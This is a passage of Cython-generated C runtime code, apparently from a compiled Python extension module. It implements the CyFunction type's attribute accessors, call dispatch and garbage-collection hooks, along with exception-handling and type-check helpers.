            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
